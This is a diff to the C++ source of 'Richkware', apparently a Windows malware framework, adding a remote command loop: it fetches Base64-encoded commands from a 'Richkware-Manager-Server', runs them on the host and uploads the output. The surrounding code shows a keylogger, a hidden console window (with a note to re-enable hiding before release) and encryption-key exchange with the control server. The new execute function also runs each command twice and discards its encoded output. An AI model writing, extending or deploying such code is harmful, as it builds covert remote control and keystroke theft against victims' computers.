@@ -90,6 +90,32 @@ void Richkware::RandMouse() {
     SetCursorPos((rand() % horizontal + 1), (rand() % vertical + 1));
 }
 
+std::vector<std::string> Richkware::getCommands(const std::string &encryptionKey) {
+    std::string commands = network.fetchCommand(encryptionKey);
+    std::string decodedCommands = Base64_decode(commands);
+    std::vector<std::string> commandList;
+    std::vector<std::string> result;
+    //decrypt string
+//    Crypto crypto(encryptionKey);
+//    if (!commands.empty()) {
+//        std::string decryptedCommands = crypto.Decrypt(commands);
+    commandList = utils::split(decodedCommands, "##");
+//        return commandList;
+//    }
+    //decode single commands
+    for (size_t i = 0; i < commandList.size(); ++i) {
+        std::string temp = Base64_decode(commandList.at(i));
+        result.push_back(temp);
+    }
+    return result;
+}
+
+std::string Richkware::executeCommand(std::string command) {
+    //encrypt the output of the command
+    std::string output = CodeExecution(command);
+    std::string encodedOutput = Base64_encode((const unsigned char *) output.c_str(), output.size());
+    return CodeExecution(command).c_str();
+}
 
 void Richkware::Keylogger(const char *fileName) {
     HANDLE hBlockAppsTh = CreateThread(0, 0, &KeyloggerThread, (void *) fileName, 0, 0);
@@ -107,12 +133,16 @@ void Richkware::Hibernation() {
                 SC_MONITORPOWER, (LPARAM) 2);
 }
 
+void Richkware::uploadCommandsResponse(std::string output, const std::string &encryptionKey) {
+    network.uploadCommand(output, encryptionKey);
+}
+
 
 Richkware::Richkware(const char *AppNameArg, std::string EncryptionKeyArg) {
     appName = AppNameArg;
     ShowWindow(GetConsoleWindow(), 0);
     encryptionKey = EncryptionKeyArg;
-    network = Network(EncryptionKeyArg);
+    //network = Network(EncryptionKeyArg);
     session = Session(EncryptionKeyArg, AppNameArg);
     systemStorage = SystemStorage(AppNameArg);
     blockApps = BlockApps();
@@ -135,38 +165,41 @@ Richkware::Richkware(const char *AppNameArg, std::string EncryptionKeyArg) {
 
 }
 
-Richkware::Richkware(const char *AppNameArg, std::string defaultEncryptionKey, const char *serverAddress,
+Richkware::Richkware(const char *AppNameArg, const std::string &defaultEncryptionKey, const char *serverAddress,
                      const char *port, const char *associatedUser) {
     appName = AppNameArg;
-    ShowWindow(GetConsoleWindow(), 0);
+    // TODO RELEASE UNCOMMENT before release
+    // Hide console
+    //ShowWindow(GetConsoleWindow(), 0);
     systemStorage = SystemStorage(AppNameArg);
 
     // **encryptionKey**: check presence of encryption key in the system
     Crypto crypto(defaultEncryptionKey);
-    std::string encKey = systemStorage.LoadValueFromFile(appName+"_encKey.richk");
+    std::string encKey = systemStorage.LoadValueFromFile(appName + "_encKey.richk");
 
     if (encKey.empty()) {
         // Key Exchange with Richkware-Manager-Server, using defaultEncryptionKey.
-        Network network1(defaultEncryptionKey);
-        encKey = network1.GetEncryptionKeyFromRMS(serverAddress, port, associatedUser);
+        //OLD Network network1(defaultEncryptionKey);
+        //OLD encKey = network1.GetEncryptionKeyFromRMS(serverAddress, port, associatedUser);
+        encKey = Network::GetEncryptionKeyFromRMS(serverAddress, port, associatedUser, defaultEncryptionKey);
 
         if (encKey.empty() || (encKey.compare("Error") == 0)) {
             // Key Exchange failed
             encryptionKey = defaultEncryptionKey;
         } else {
             // Key Exchange succeed
-            encryptionKey = encKey.c_str();
+            encryptionKey = encKey;
             // save the encryption key(obtained from the RMS), encrypted with default password
             encKey = crypto.Encrypt(encKey);
-            systemStorage.SaveValueToFile(appName+"_encKey.richk", encKey);
+            systemStorage.SaveValueToFile(appName + "_encKey.richk", encKey);
         }
     } else {
         // Encryption Key already present
         encKey = crypto.Decrypt(encKey);
-        encryptionKey = encKey.c_str();
+        encryptionKey = encKey;
     }
 
-    network = Network(encryptionKey);
+    network = Network(serverAddress, port, associatedUser, encryptionKey);
     session = Session(encryptionKey, AppNameArg);
     blockApps = BlockApps();
 }
